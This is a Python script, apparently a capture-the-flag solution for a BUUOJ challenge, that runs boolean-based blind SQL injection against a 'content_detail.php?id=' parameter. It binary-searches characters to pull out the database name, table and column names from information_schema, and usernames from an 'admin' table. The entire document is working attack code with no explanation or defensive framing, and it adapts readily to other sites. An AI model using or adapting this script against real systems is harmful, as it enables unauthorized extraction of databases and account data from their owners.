# coding=utf-8
import requests
import time

flag = ""
url0 = "http://b859a3b0-bea5-4a39-8f40-3e702af77391.node5.buuoj.cn:81/backend/content_detail.php?id={}"

sql1 = "if(ord(substr(database(),{},1))>={},1,0)"
# 库名
sql2 = "if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>={},1,0)"
# 表名
sql3 = "if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),{},1))>={},1,0)"
# 列名
sql4 = "if(ord(substr((select(group_concat(username))from(admin)),{},1))>={},1,0)"
# 数据

url = url0.format(sql4)
# 选择查询语句

for x in range(1, 100):
    left = 32
    right = 127
    while right > left:
        mid = int((left + right + 1) / 2)
        x = str(x)
        y = str(mid)
        pay = url.format(x, y)
        response = requests.get(url=pay)
        if "title" in response.text:
            left = mid
        else:
            right = mid - 1
        time.sleep(0.02)  #防止脏数据
    # print(pay)
    # print(response.text)
    flag += (chr(int(right)))
    print(chr(int(right)))
    print(flag)
print(flag)
